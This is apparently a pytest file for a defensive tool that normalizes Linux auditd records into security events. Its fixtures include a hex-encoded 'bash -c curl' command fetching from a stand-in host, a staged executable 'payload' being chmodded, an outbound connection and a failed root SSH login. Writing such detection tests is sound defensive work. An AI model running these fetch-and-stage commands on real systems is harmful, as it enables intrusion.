"""Linux audit serial aggregation contract and normalization tests."""

from __future__ import annotations

import json
from datetime import UTC, datetime

import pytest
from pydantic import ValidationError

from blue_team.agent_core import AuditdRecord, AuditdSerialGroup
from blue_team.domain.security_event import SourceKind
from blue_team.normalize import RawInput, get_normalizer

TENANT = "ten_01JAUDITTENANT"
HOST = "host_01JAUDITHOST"
AGENT = "agent_01JAUDITAGENT"
BOOT = "0fdec470-09f9-4dd3-a63f-3b8cdfb11028"
SERIAL = 420
STAMP = "1786176000.123"


def _line(record_type: str, fields: str = "", *, serial: int = SERIAL) -> str:
    suffix = f" {fields}" if fields else ""
    return f"type={record_type} msg=audit({STAMP}:{serial}):{suffix}"


def audit_raw(
    records: list[tuple[str, str]],
    *,
    complete: bool = True,
    boot_id: str = BOOT,
    trusted_boot_id: str | None = BOOT,
    serial: int = SERIAL,
    host_id: str = HOST,
) -> RawInput:
    group = {
        "schema_version": "0.1.0",
        "boot_id": boot_id,
        "serial": serial,
        "complete": complete,
        "records": [
            {"record_type": record_type, "message": message} for record_type, message in records
        ],
    }
    return RawInput(
        source_kind=SourceKind.AUDITD,
        raw_payload=json.dumps(group, separators=(",", ":")).encode(),
        raw_ref=f"evidence://{TENANT}/audit/{serial}",
        tenant_id=TENANT,
        host_id=host_id,
        agent_id=AGENT,
        boot_id=trusted_boot_id,
        received_at=datetime(2026, 8, 8, 8, 0, 1, tzinfo=UTC),
    )


def _complete(records: list[tuple[str, str]]) -> list[tuple[str, str]]:
    return [*records, ("EOE", _line("EOE"))]


def test_agent_contract_requires_terminal_eoe_for_complete_group() -> None:
    with pytest.raises(ValidationError, match="must end with EOE"):
        AuditdSerialGroup(
            boot_id=BOOT,
            serial=SERIAL,
            complete=True,
            records=(AuditdRecord(record_type="SYSCALL", message=_line("SYSCALL")),),
        )


def test_audit_exec_combines_syscall_execve_cwd_and_paths() -> None:
    raw = audit_raw(
        _complete(
            [
                (
                    "SYSCALL",
                    _line(
                        "SYSCALL",
                        "arch=c000003e syscall=59 success=yes exit=0 a0=0 "
                        'ppid=4100 pid=4242 auid=1000 uid=33 exe="/usr/bin/bash" '
                        'comm="bash" key="runtime-exec"',
                    ),
                ),
                (
                    "EXECVE",
                    _line(
                        "EXECVE",
                        'argc=3 a0="bash" a1="-c" '
                        "a2=6375726c2068747470733a2f2f6578616d706c652e746573742f70",
                    ),
                ),
                ("CWD", _line("CWD", 'cwd="/var/www"')),
                (
                    "PATH",
                    _line(
                        "PATH",
                        'item=0 name="../tmp/payload" inode=991 mode=0100755 nametype=NORMAL',
                    ),
                ),
                (
                    "PROCTITLE",
                    _line("PROCTITLE", "proctitle=62617368002d63006964"),
                ),
            ]
        )
    )

    result = get_normalizer(SourceKind.AUDITD).normalize(raw)  # type: ignore[union-attr]

    assert result.dlq is None
    assert result.event is not None
    assert result.event.event_type == "process.exec"
    assert result.event.boot_id == BOOT
    assert result.event.source_event_id == f"audit:{BOOT}:{SERIAL}"
    assert result.event.actor is not None
    assert result.event.actor.pid == 4242
    assert result.event.actor.ppid == 4100
    assert result.event.process is not None
    assert result.event.process.path == "/usr/bin/bash"
    assert result.event.process.command_line == "bash -c 'curl https://example.test/p'"
    assert result.event.file is not None
    assert result.event.file.path == "/var/tmp/payload"
    assert result.event.outcome == "success"
    assert result.event.extensions["audit.serial"] == SERIAL
    assert result.event.extensions["audit.complete"] is True
    assert result.event.extensions["audit.syscall"] == "execve"
    assert result.dedupe_key.startswith("sid:")
    assert len(result.dedupe_key) == 68


def test_audit_chmod_maps_file_and_resolves_relative_path() -> None:
    raw = audit_raw(
        _complete(
            [
                (
                    "SYSCALL",
                    _line(
                        "SYSCALL",
                        "arch=c000003e syscall=90 success=yes exit=0 ppid=200 pid=201 "
                        'uid=1000 exe="/usr/bin/chmod"',
                    ),
                ),
                ("CWD", _line("CWD", 'cwd="/tmp/stage"')),
                (
                    "PATH",
                    _line("PATH", 'item=0 name="payload" inode=992 mode=0100755 nametype=NORMAL'),
                ),
            ]
        )
    )

    result = get_normalizer(SourceKind.AUDITD).normalize(raw)  # type: ignore[union-attr]

    assert result.event is not None
    assert result.event.event_type == "file.chmod"
    assert result.event.file is not None
    assert result.event.file.path == "/tmp/stage/payload"
    assert result.event.actor is not None
    assert result.event.actor.pid == 201


def test_audit_sockaddr_connect_maps_destination() -> None:
    raw = audit_raw(
        _complete(
            [
                (
                    "SYSCALL",
                    _line(
                        "SYSCALL",
                        "arch=c000003e syscall=42 success=yes exit=0 ppid=200 pid=201 "
                        'uid=1000 exe="/usr/bin/curl"',
                    ),
                ),
                (
                    "SOCKADDR",
                    _line("SOCKADDR", "saddr=020001BBC63364070000000000000000"),
                ),
            ]
        )
    )

    result = get_normalizer(SourceKind.AUDITD).normalize(raw)  # type: ignore[union-attr]

    assert result.event is not None
    assert result.event.event_type == "network.connect"
    assert result.event.network is not None
    assert str(result.event.network.dst_ip) == "198.51.100.7"
    assert result.event.network.dst_port == 443
    assert result.event.extensions["audit.address_family"] == "inet"


def test_audit_user_auth_parses_nested_pam_message() -> None:
    raw = audit_raw(
        _complete(
            [
                (
                    "USER_AUTH",
                    _line(
                        "USER_AUTH",
                        "pid=990 uid=0 auid=1000 ses=4 "
                        'msg=\'op=PAM:authentication acct="root" '
                        'exe="/usr/sbin/sshd" addr=203.0.113.8 terminal=ssh res=failed\'',
                    ),
                )
            ]
        )
    )

    result = get_normalizer(SourceKind.AUDITD).normalize(raw)  # type: ignore[union-attr]

    assert result.event is not None
    assert result.event.event_type == "network.ssh"
    assert result.event.outcome == "failure"
    assert result.event.actor is not None
    assert result.event.actor.user == "root"
    assert result.event.network is not None
    assert str(result.event.network.src_ip) == "203.0.113.8"


@pytest.mark.parametrize(
    ("raw", "reason"),
    [
        (
            audit_raw([("SYSCALL", _line("SYSCALL"))], complete=False),
            "aggregation_incomplete",
        ),
        (
            audit_raw(_complete([("SYSCALL", _line("SYSCALL"))]), boot_id="other-boot"),
            "identity_validation_failed",
        ),
        (
            audit_raw(_complete([("SYSCALL", _line("SYSCALL", serial=SERIAL + 1))])),
            "schema_validation_failed",
        ),
        (
            audit_raw(_complete([("PATH", _line("SYSCALL"))])),
            "schema_validation_failed",
        ),
    ],
)
def test_invalid_or_partial_audit_groups_enter_dlq(raw: RawInput, reason: str) -> None:
    result = get_normalizer(SourceKind.AUDITD).normalize(raw)  # type: ignore[union-attr]

    assert result.event is None
    assert result.dlq is not None
    assert result.dlq.reason == reason


def test_audit_dedupe_is_stable_for_same_boot_and_serial() -> None:
    first = audit_raw(
        _complete(
            [
                ("SYSCALL", _line("SYSCALL", "arch=c000003e syscall=59 pid=1")),
                ("EXECVE", _line("EXECVE", 'argc=1 a0="id"')),
            ]
        )
    )
    second = audit_raw(
        _complete(
            [
                ("EXECVE", _line("EXECVE", 'argc=1 a0="id"')),
                ("SYSCALL", _line("SYSCALL", "arch=c000003e syscall=59 pid=1")),
            ]
        )
    )

    normalizer = get_normalizer(SourceKind.AUDITD)
    first_result = normalizer.normalize(first)  # type: ignore[union-attr]
    second_result = normalizer.normalize(second)  # type: ignore[union-attr]

    assert first_result.event is not None
    assert second_result.event is not None
    assert first_result.event.event_id == second_result.event.event_id
    assert first_result.dedupe_key == second_result.dedupe_key


def test_audit_dedupe_does_not_collapse_same_boot_and_serial_across_hosts() -> None:
    records = _complete(
        [
            ("SYSCALL", _line("SYSCALL", "arch=c000003e syscall=59 pid=1")),
            ("EXECVE", _line("EXECVE", 'argc=1 a0="id"')),
        ]
    )
    normalizer = get_normalizer(SourceKind.AUDITD)

    first = normalizer.normalize(audit_raw(records))  # type: ignore[union-attr]
    second = normalizer.normalize(  # type: ignore[union-attr]
        audit_raw(records, host_id="host_01JAUDITHOSTB")
    )

    assert first.event is not None
    assert second.event is not None
    assert first.event.event_id != second.event.event_id
    assert first.dedupe_key != second.dedupe_key


__all__ = ["audit_raw"]
